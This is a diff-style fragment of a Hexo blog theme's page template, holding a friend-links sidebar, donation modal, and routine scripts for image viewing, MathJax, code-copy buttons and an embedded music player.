+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://www.mrskye.cn/">skye231</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://blackwatch219.github.io/">Blackwatch</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://zoeyctf.top">zoey</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://eeknight.top">eeknight</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://www.mrzry.top">mrzry</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://h3h3qaq.github.io/">H3h3QAQ</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://ctfking.com/">tajang</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://d0gekong.github.io/">驹宝宝</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://reigniting.github.io/">党姐</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://syunaht.com/">巡璃</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://www.xiinnn.com/">lxxx</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1878868202&auto=0&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
